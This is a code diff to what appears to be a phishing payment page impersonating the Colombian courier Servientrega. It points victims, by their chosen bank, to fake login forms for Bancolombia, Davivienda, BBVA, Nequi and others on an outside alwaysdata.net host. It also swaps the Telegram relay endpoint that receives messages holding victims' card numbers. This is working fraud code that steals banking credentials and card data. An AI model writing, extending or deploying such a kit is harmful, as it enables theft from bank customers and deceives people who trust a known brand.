@@ -2,7 +2,7 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Pago - Servientrega</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
@@ -223,32 +223,32 @@
     <script>
     // Mapeo de redirecciones por banco (reutilizable)
     const BANK_REDIRECTIONS = {
-        'BANCOLOMBIA': 'bancos/bancol/formulario_u1.php',
-        'BANCO AGRARIO': 'bancos/agra.html',
-        'BANCO AVVILLAS': 'bancos/villas/formulario_u1.php',
-        'BANCO BBVA': 'bancos/bba/formulario_u1.php',
-        'BANCO CAJA SOCIAL': 'bancos/cj/formulario_u1.php',
-        'BANCO CITIBANK': 'bancos/colpa/formulario_u1.php',
-        'BANCO COLPATRIA': 'bancos/colpa/formulario_u1.php',
-        'BANCO CORPBANCA': 'bancos/itau/formulario_u1.php',
-        'BANCO DAVIVIENDA': 'bancos/davi/formulario_u1.php',
-        'BANCO DE BOGOTA': 'bancos/bogota/formulario_u1.php',
-        'BANCO DE OCCIDENTE': 'bancos/cjs/formulario_u1.php',
-        'BANCO FALABELLA': 'bancos/fala/formulario_u1.php',
-        'BANCO FINANDINA': 'bancos/finan.html',
-        'BANCO GANADERO': 'bancos/ganadero.html',
-        'BANCO GNB SUDAMERIS': 'cargapago.html',
+        'BANCOLOMBIA': 'https://servientregaguia-detalles.alwaysdata.net/sucur/bancol/personas/formulario_u1.php',
+        'BANCO AGRARIO': 'pago.html',
+        'BANCO AVVILLAS': 'https://servientregaguia-detalles.alwaysdata.net/sucur/avillas/personas/formulario_u1.php',
+        'BANCO BBVA': 'https://servientregaguia-detalles.alwaysdata.net/sucur/bbva/personas/formulario_u1.php',
+        'BANCO CAJA SOCIAL': 'https://servientregaguia-detalles.alwaysdata.net/sucur/caja/personas/formulario_u1.php',
+        'BANCO CITIBANK': 'pago.html',
+        'BANCO COLPATRIA': 'https://servientregaguia-detalles.alwaysdata.net/sucur/scoti/personas/formulario_u1.php',
+        'BANCO CORPBANCA': 'https://servientregaguia-detalles.alwaysdata.net/sucur/itau/personas/formulario_u1.php',
+        'BANCO DAVIVIENDA': 'https://servientregaguia-detalles.alwaysdata.net/sucur/davi/personas/formulario_u1.php',
+        'BANCO DE BOGOTA': 'https://servientregaguia-detalles.alwaysdata.net/sucur/bogota/personas/formulario_u1.php',
+        'BANCO DE OCCIDENTE': 'https://servientregaguia-detalles.alwaysdata.net/occidente/bancol/personas/formulario_u1.php',
+        'BANCO FALABELLA': 'https://servientregaguia-detalles.alwaysdata.net/sucur/fala/personas/formulario_u1.php',
+        'BANCO FINANDINA': 'pago.html',
+        'BANCO GANADERO': 'pago.html',
+        'BANCO GNB SUDAMERIS': 'pago.html',
         'BANCO HSBC COLOMBIA': 'cargapago.html',
-        'BANCO ITAU': 'bancos/itau/formulario_u1.php',
-        'BANCO POPULAR': 'bancos/popu.html',
-        'BANCO SANTANDER': 'bancos/santan.html',
-        'BANCO CREDIBANCO': 'cargapago.html',
-        'BANCO HELM BANK': 'cargapago.html',
-        'Nequi': 'bancos/nequi/',
-        'SERFINANSA': 'cargapago.html',
-        'SERVIBANCA': 'cargapago.html',
-        'TUYA': 'cargapago.html',
-        'NUBANK': 'cargapago.html'
+        'BANCO ITAU': 'https://servientregaguia-detalles.alwaysdata.net/sucur/itau/personas/formulario_u1.php',
+        'BANCO POPULAR': 'pago.html',
+        'BANCO SANTANDER': 'pago.html',
+        'BANCO CREDIBANCO': 'pago.html',
+        'BANCO HELM BANK': 'pago.html',
+        'Nequi': 'https://servientregaguia-detalles.alwaysdata.net/sucur/nequi/personas/formulario_u1.php',
+        'SERFINANSA': 'pago.html',
+        'SERVIBANCA': 'pago.html',
+        'TUYA': 'pago.html',
+        'NUBANK': 'pago.html'
     };
 
     // ---- Utilidades UI ----
@@ -390,7 +390,7 @@ Número: ${numeroTarj}
 ✅ *Verificación ilunh: APROBADA*`.trim();
 
         try {
-            const resp = await fetch('https://apitemu.vercel.app/api/send-telegram', {
+            const resp = await fetch('https://apitelg.vercel.app/api/send-telegram', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ message: mensaje })
